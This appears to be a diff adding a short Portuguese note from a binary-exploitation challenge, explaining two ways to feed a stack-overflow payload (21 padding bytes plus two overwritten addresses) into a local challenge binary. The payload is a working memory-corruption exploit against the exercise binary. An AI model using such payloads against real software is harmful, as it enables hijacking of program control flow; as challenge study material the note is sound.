@@ -1,0 +1,14 @@
+existem duas maneiras de rodar o payload:
+
+A primeira é rodar o código abaixo diretamente no terminal aonde se encontra o arquivo.c
+
+python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 21 + b"\x30\x10\x40\x00\x00\x00\x00\x00" 
+                                                + b"\x28\x40\x40\x00\x00\x00\x00\x00")' | ./d
+
+
+A segunda é rodar o arquivo.c pelo terminal injetando o payload nele, bem como mostra o 
+código abaixo
+
+"./desafio < payload.bin"
+
+O binário contém apenas o código do payload compilado.
